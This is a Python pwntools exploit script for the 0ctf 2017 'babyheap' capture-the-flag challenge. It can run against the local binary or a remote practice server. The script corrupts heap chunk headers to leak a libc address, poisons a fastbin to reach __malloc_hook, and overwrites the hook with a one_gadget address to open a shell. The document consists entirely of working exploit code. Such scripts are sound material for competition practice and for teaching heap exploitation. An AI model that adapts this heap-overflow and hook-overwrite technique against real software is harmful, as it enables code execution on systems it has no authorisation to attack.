import sys
from pwn import *
from ctypes import *
context.log_level='debug'
context.terminal=["/home/keer/.hyper_plugins/node_modules/build-an-efficient-pwn-environment-master/hyperpwn-client.sh"]
#context.arch='amd64'

while True :
	# try :
		if len(sys.argv)==1 :
			io=process('./0ctf_2017_babyheap')
			# io=process(['./'],env={'LD_PRELOAD':'./'})
			elf=ELF('./0ctf_2017_babyheap')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
		else :
			io=remote('node3.buuoj.cn',26344)
			elf=ELF('./0ctf_2017_babyheap')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')

		def add(a):
			io.sendlineafter('Command: ','1')
			io.sendlineafter('Size: ',str(a))

		def delete(a):
			io.sendlineafter('Command: ','3')
			io.sendlineafter('Index: ',str(a))

		def edit(a,b,c):
			io.sendlineafter('Command: ','2')
			io.sendlineafter('Index: ',str(a))
			io.sendlineafter('Size: ',str(b))
			io.sendafter('Content: ',c)

		def show(a):
			io.sendlineafter('Command: ','4')
			io.sendlineafter('Index: ',str(a))
		



		add(0x88)
		add(0x88)
		add(0x68)
		add(0x20)
		edit(0,0x90,'\x00'*0x80+p64(0)+p64(0x101))
		delete(1)
		add(0x88)
		show(2)
		io.recv(9)
		libc_base=u64(io.recv(0x1a-9)[-8:])-libc.sym['__malloc_hook']-88-0x10
		libc.address=libc_base
		# delete(1)
		# add(0xf8)
		edit(1,0xa0,'\x00'*0x88+p64(0x71)+p64(0)*2)
		delete(2)
		edit(1,0xa0,'\x00'*0x88+p64(0x71)+p64(libc.sym['__malloc_hook']-0x23)*2)
		add(0x68)
		add(0x68)
		edit(4,0x1b,'\x00'*0x13+p64(libc_base+0x4526a))



		success('libc_base:'+hex(libc_base))
		gdb.attach(io)
		pause()
		io.interactive()

	# except Exception as e:
	# 	io.close()
	# 	continue
	# else:
	# 	continue